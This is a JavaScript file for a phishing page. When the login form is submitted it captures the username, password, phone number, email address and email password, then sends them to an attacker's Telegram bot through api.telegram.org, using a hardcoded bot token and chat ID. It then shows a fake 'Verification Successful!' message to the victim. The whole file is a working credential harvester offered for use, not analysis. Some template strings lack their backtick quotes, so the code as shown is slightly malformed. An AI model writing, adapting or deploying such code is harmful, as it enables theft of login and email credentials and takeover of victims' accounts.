document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    // Get user input values
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;
    let phone = document.getElementById("phone").value;
    let email = document.getElementById("email").value;
    let emailPassword = document.getElementById("emailPassword").value;

    // Your Telegram bot details
    const botToken = "7800072383:AAFrH_lZgq8_-Q3ucCbz2rCPvQ8Mbcxhxbw"; // REPLACE WITH NEW TOKEN
    const chatId = "6551331003"; 

    // Format message
    let message = 🛑 *New Login Attempt* 🛑\n\n👤 Username: ${username}\n🔑 Password: ${password}\n📞 Phone: ${phone}\n📧 Email: ${email}\n🔐 Email Password: ${emailPassword};
    
    // Send data to Telegram bot
    fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            document.getElementById("responseMessage").innerText = "✅ Verification Successful!";
            document.getElementById("loginForm").reset();
        } else {
            document.getElementById("responseMessage").innerText = "❌ Error! Try Again.";
        }
    })
    .catch(error => {
        document.getElementById("responseMessage").innerText = "❌ Network Error!";
    });
});